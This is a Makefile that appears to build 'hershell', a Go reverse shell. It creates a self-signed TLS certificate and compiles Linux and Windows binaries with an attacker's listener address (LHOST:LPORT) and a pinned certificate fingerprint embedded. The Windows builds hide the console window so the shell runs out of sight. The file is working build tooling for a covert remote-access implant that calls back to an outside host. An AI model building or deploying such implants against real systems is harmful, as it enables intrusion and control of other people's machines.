OUT_LINUX=hershell
OUT_WINDOWS=hershell.exe
SRC=hershell.go
SRV_KEY=server.key
SRV_PEM=server.pem

all: clean depends shell

depends:
	openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

shell:
	GOOS=${GOOS} GOARCH=${GOARCH} go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)" -o ${OUT} ${SRC}


linux32: depends
	GOOS=linux GOARCH=386 go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)" -o ${OUT_LINUX} ${SRC}

linux64: depends
	GOOS=linux GOARCH=amd64 go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)" -o ${OUT_LINUX} ${SRC}

windows32: depends
	GOOS=windows GOARCH=386 go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui" -o ${OUT_WINDOWS} ${SRC}

windows64: depends
	GOOS=windows GOARCH=amd64 go build --ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui" -o ${OUT_WINDOWS} ${SRC}

clean:
	rm -f ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX} ${OUT_WINDOWS}
